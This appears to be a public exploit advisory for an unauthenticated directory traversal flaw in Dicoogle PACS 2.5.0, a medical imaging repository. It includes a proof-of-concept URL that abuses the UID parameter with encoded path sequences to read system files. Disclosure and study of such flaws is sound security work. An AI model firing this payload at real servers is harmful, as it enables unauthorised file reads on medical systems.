@@ -1,0 +1,19 @@
+# Exploit Title: Dicoogle PACS 2.5.0 - Directory Traversal
+# Date: 2018-05-25
+# Software Link: http://www.dicoogle.com/home
+# Version: Dicoogle PACS 2.5.0-20171229_1522
+# Category: webapps
+# Tested on: Windows 2012 R2
+# Exploit Author: Carlos Avila
+# Contact: http://twitter.com/badboy_nt
+
+# 1. Description
+# Dicoogle is an open source medical imaging repository with an extensible
+# indexing system and distributed mechanisms. In version 2.5.0, it is vulnerable
+# to local file inclusion. This allows an attacker to read arbitrary files that the
+# web user has access to. Admin credentials aren't required. The ‘UID’ parameter
+# via GET is vulnerable.
+
+# 2. Proof of Concept
+
+http://Target:8080/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
